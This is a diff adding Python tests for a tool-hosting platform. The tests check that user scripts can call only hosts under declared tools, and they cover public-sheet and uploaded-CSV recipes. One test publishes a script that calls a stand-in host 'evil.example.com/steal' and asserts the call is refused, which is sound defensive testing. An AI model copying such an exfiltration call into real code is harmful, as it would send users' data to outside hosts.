@@ -504,3 +504,81 @@ async def test_the_earnings_report_counts_runs_and_credit_never_callers(
     assert csv.headers["content-type"].startswith("text/csv") and csv.text.startswith("day,runs,ok,failed,earned_usd")
     # another team cannot read it
     assert (await matrix_clients.get(f"/hub/tools/{tool_id}/earnings", headers=caller_h)).status_code == 404
+
+
+# ---------------------------------------------------------------------------------------------
+# Phase 7.5: the URL target, the public sheet, the uploaded CSV
+
+async def test_a_full_url_under_an_own_tool_in_uses_is_allowed_and_any_other_host_is_refused(
+    matrix_clients: AsyncClient, fake_provider: FakeProvider, platform_on, hub_on,
+):
+    sid = (await matrix_clients.post("/secrets", json={"name": "k", "value": "MY-KEY"})).json()["id"]
+    await matrix_clients.post("/tools", json={"name": "my-api", "base_url": "https://fake-provider.invalid/api", "secret_id": sid})
+    tool_id = await _publish_script(matrix_clients, """
+export default async function run(ctx) {
+  const r = await ctx.call("https://fake-provider.invalid/api/v1/things?page=2", { query: { size: "5" } });
+  return { path: r.status };
+}""", ["my-api"], ["path"])
+    r = await matrix_clients.post(f"/call/{tool_id}", json={"domain": "x"}, headers=FAKE)
+    assert r.status_code == 200, r.text
+    hit = fake_provider.hits[-1]
+    assert hit.path == "/api/v1/things" and set(hit.query) >= {("page", "2"), ("size", "5")}
+    assert hit.headers["authorization"] == "Bearer MY-KEY"
+    # another host, even a real one, is refused and the run stops
+    tool2 = await _publish_script(matrix_clients, """
+export default async function run(ctx) {
+  await ctx.call("https://evil.example.com/steal", {});
+  return { path: 1 };
+}""", ["my-api"], ["path"])
+    r2 = await matrix_clients.post(f"/call/{tool2}", json={"domain": "x"}, headers=FAKE)
+    assert r2.status_code == 424 and "not under a tool in `uses`" in r2.json()["detail"]["message"]
+
+
+async def test_the_public_sheet_recipe_runs_on_a_secretless_tool(
+    matrix_clients: AsyncClient, fake_provider: FakeProvider, platform_on, hub_on, monkeypatch,
+):
+    import json as _json
+    from pathlib import Path
+    folder = Path(__file__).resolve().parents[2] / "docs" / "hub-recipes" / "data-sheets"
+    r = await matrix_clients.post("/tools", json={"name": "sheets", "base_url": "https://fake-provider.invalid"})
+    assert r.status_code in (200, 201), r.text          # a public sheet needs no secret
+    # the check run is an in-process request under the maker's identity: it carries no X-Fake-*
+    # header, so the "sheet" answers from a fixed body for this test
+    sheet = b"company,country\nFigma,us\nCanva,au\nNotion,us\n"
+    monkeypatch.setattr(FakeProvider, "_response_body", staticmethod(lambda request, headers: sheet))
+    manifest = _json.loads((folder / "recipe.json").read_text())
+    pub = await matrix_clients.post("/hub/tools", json={
+        "manifest": manifest, "script": (folder / "run.js").read_text(),
+        "check": _json.loads((folder / "check.json").read_text()), "readme": (folder / "README.md").read_text()})
+    assert pub.status_code == 201 and pub.json()["status"] == "live", pub.text
+    r = await matrix_clients.post(f"/call/{pub.json()['tool_id']}",
+                                  json={"sheet_id": "abc", "column": "country", "equals": "us"})
+    assert r.status_code == 200, r.text
+    assert r.json()["output"] == {"rows": [{"company": "Figma", "country": "us"}, {"company": "Notion", "country": "us"}], "count": 2}
+    hit = fake_provider.hits[-1]
+    assert hit.path == "/spreadsheets/d/abc/export" and ("format", "csv") in hit.query and "authorization" not in hit.headers
+
+
+async def test_the_uploaded_csv_recipe_serves_its_own_data_with_no_call(
+    matrix_clients: AsyncClient, fake_provider: FakeProvider, platform_on, hub_on,
+):
+    import json as _json
+    from pathlib import Path
+    folder = Path(__file__).resolve().parents[2] / "docs" / "hub-recipes" / "data-csv"
+    body = {"manifest": _json.loads((folder / "recipe.json").read_text()), "script": (folder / "run.js").read_text(),
+            "check": _json.loads((folder / "check.json").read_text()), "readme": (folder / "README.md").read_text(),
+            "data": (folder / "data.csv").read_text()}
+    hits = len(fake_provider.hits)
+    pub = await matrix_clients.post("/hub/tools", json=body)
+    assert pub.status_code == 201 and pub.json()["status"] == "live", pub.text
+    tool_id = pub.json()["tool_id"]
+    r = await matrix_clients.post(f"/call/{tool_id}", json={"column": "plan", "equals": "enterprise"})
+    assert r.status_code == 200, r.text
+    assert r.json()["output"]["count"] == 2 and [x["company"] for x in r.json()["output"]["rows"]] == ["Figma", "Supabase"]
+    assert r.json()["usage"]["steps"] == 0 and len(fake_provider.hits) == hits      # no call at all
+    mine = (await matrix_clients.get("/hub/tools/mine")).json()[0]
+    assert mine["data"] == {"rows": 5, "bytes": len((folder / "data.csv").read_text().encode())}
+    assert "data uploaded with the tool: 5 rows" in (await matrix_clients.get(f"/hub/{tool_id}")).text
+    # a bad CSV is refused by field and rule; a CSV on a steps recipe too
+    bad = await matrix_clients.post("/hub/tools", json={**body, "data": "just one line"})
+    assert bad.status_code == 422 and bad.json()["detail"]["field"] == "data"
